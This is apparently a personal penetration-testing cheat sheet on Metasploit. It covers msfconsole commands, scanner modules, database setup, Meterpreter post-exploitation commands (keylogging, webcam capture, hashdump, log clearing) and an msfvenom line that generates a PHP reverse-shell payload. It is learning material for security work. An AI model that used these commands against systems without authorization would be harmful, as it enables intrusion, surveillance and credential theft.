---
description: Framework that is used in all phases of penetration testing engagement
---

# Metasploit

Has two versions: Pro and Framework

Summary of components:

* `msfconsole` - main command-line interface
* Modules - supports modules such as exploits scanners payloads, etc.
* Tools - support standalone tools that wil help vulnerability resarch, assessement or pentesting.\
  Such tools are: msfvenom, pattern\_create and pattern\_offset
* It supports most linux commands (not output redirection)

Definitions:

* Exploit: a piece of code that uses a vulnerability present on the target system
* Vulnerability: A design, coding, or logic flaw affecting the target system. The exploitation of a vulnerability can result in disclosing confidential information or allowing the attacker to execute code on the target system
* Payload: An exploit will take advantage of a vulnerability. However, if we want the exploit to have the result we want (gaining access to the target system, read confidential information, etc.), we need to use a payload. Payloads are the code that will run on the target system.

{% tabs %}
{% tab title="Basic Commands" %}
- `help <CMD>` - gives help menu for a specific command
- `use <library>` - uses a tool as an exploit for example
- `show options` - shows the list of options relative to a context selected
- `show <type>` - show a list of available modules to be used
- `back` - leave the context
- `info (<MODULE>)` - gives infos about a module
- `search (<type>) <CVE/EXPLNAME>` gives list of modules relevant to specific parameter
- `set <PARAMETER> <VALUE>` - gives value to a specific parameter
- `unset <parameter/all>` - clear an option
- `setg <param> <val>` - set parameters for all modules
- `unsetg <param/all>` - clear a global option for all modules
- `exploit / run (-z)` - Command to execute the module (in background)
- `check` - can be used to check if a system is vulnerable without exploiting it
- `sessions -i <val>` - used to retrieve background sessions (or interact with it)
{% endtab %}

{% tab title="Modules" %}
You can use Nmap for scanning part, even tough metasploit has some great modules

* auxiliary/scanner/discovery/udp\_sweep - module that allows to quickly identify services running over UDP (such as DNS and NetBios)
* auxiliary/scanner/smb/smb\_version or smb\_enumshares  - scan SMB services
* auxiliary/scanner/smb/smb\_login - bruteforce login
* auxiliary/scanner/http/http\_version - scan HTTP services\

{% endtab %}

{% tab title="Database" %}
{% hint style="info" %}
First steps in shell not in msfconsole
{% endhint %}

Start posgres

```
systemctl start postgresql
```

* `msfdb init` - init Metasploit Database

### In Metasploit

* `db_status` - retrieve the status of Database
* `workspace` - allows to separate projects
* `workspace -a <name>`  - add a new workspace
* `workspace -d <name>` - delete a workspace
* `workspace -h` - get help
* `help` - will now show the database relative commands
* `db_nmap` - allows to save results in a DB
* `hosts (-h)` - you can now print info about hosts
* `services (-h)` - same with running services
* `services -S <service>` - allows to search for specific service
{% endtab %}

{% tab title="Meterpreter" %}
* `getpid` - get the pid of the meterpreter instance running in memory on the target
* `help` - every meterpreter command has different options

## Some Windows commands

Core commands

* `background`: Backgrounds the current session
* `exit`: Terminate the Meterpreter session
* `guid`: Get the session GUID (Globally Unique Identifier)
* `help`: Displays the help menu
* `info`: Displays information about a Post module
* `irb`: Opens an interactive Ruby shell on the current session
* `load`: Loads one or more Meterpreter extensions
* `migrate`: Allows you to migrate Meterpreter to another process
* `run`: Executes a Meterpreter script or Post module
* `sessions`: Quickly switch to another session

File system commands

* `cd`: Will change directory
* `ls`: Will list files in the current directory (dir will also work)
* `pwd`: Prints the current working directory
* `edit`: will allow you to edit a file
* `cat`: Will show the contents of a file to the screen
* `rm`: Will delete the specified file
* `search`: Will search for files
* `upload`: Will upload a file or directory
* `download`: Will download a file or directory

Networking commands

* `arp`: Displays the host ARP (Address Resolution Protocol) cache
* `ifconfig`: Displays network interfaces available on the target system\

* `netstat`: Displays the network connections
* `portfwd`: Forwards a local port to a remote service
* `route`: Allows you to view and modify the routing table

System commands

* `clearev`: Clears the event logs
* `execute`: Executes a command
* `getpid`: Shows the current process identifier
* `getuid`: Shows the user that Meterpreter is running as
* `kill`: Terminates a process
* `pkill`: Terminates processes by name
* `ps`: Lists running processes
* `reboot`: Reboots the remote computer
* `shell`: Drops into a system command shell
* `shutdown`: Shuts down the remote computer
* `sysinfo`: Gets information about the remote system, such as OS

Others Commands (these will be listed under different menu categories in the help menu)

* `idletime`: Returns the number of seconds the remote user has been idle
* `keyscan_dump`: Dumps the keystroke buffer
* `keyscan_start`: Starts capturing keystrokes
* `keyscan_stop`: Stops capturing keystrokes
* `screenshare`: Allows you to watch the remote user's desktop in real time
* `screenshot`: Grabs a screenshot of the interactive desktop
* `record_mic`: Records audio from the default microphone for X seconds
* `webcam_chat`: Starts a video chat
* `webcam_list`: Lists webcams
* `webcam_snap`: Takes a snapshot from the specified webcam
* `webcam_stream`: Plays a video stream from the specified webcam
* `getsystem`: Attempts to elevate your privilege to that of local system
* `hashdump`: Dumps the contents of the SAM database
{% endtab %}

{% tab title="Msfvenom" %}
List payloads

```
msfvenom -l payloads
```

List formats

```
msfvenom --list formats
```

Set encoding, protocol and output type&#x20;

```
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64
```

### Handlers

They are the listening connection for payloads connection to our handler
{% endtab %}
{% endtabs %}

## Types

### Auxiliary

* Supports modules such as Scanners, Crawlers, fuzzers

### Encoders

* Supports modules that encode payloades in hope that sig-based antivirus miss them even if this is not the primary goal of encoding

### Evasion

* Used to evad antivirus detection

### Exploits

* Uses vulnerabilities in systems

### NOPs

* Does Nothing. They are often used as a buffer to achieve consistent payload sizes.

### Payloads

* Code that will run over a target system
* Adapters: An adapter wraps single payloads to convert them into different formats. For example, a normal single payload can be wrapped inside a Powershell adapter, which will make a single powershell command that will execute the payload.
* Singles: Self-contained payloads (add user, launch notepad.exe, etc.) that do not need to download an additional component to run.
* Stagers: Responsible for setting up a connection channel between Metasploit and the target system. Useful when working with staged payloads. “Staged payloads” will first upload a stager on the target system then download the rest of the payload (stage). This provides some advantages as the initial size of the payload will be relatively small compared to the full payload sent at once.
* Stages: Downloaded by the stager. This will allow you to use larger sized payloads.

### Post

* They are useful on final stage of pentesting for post-exploitation
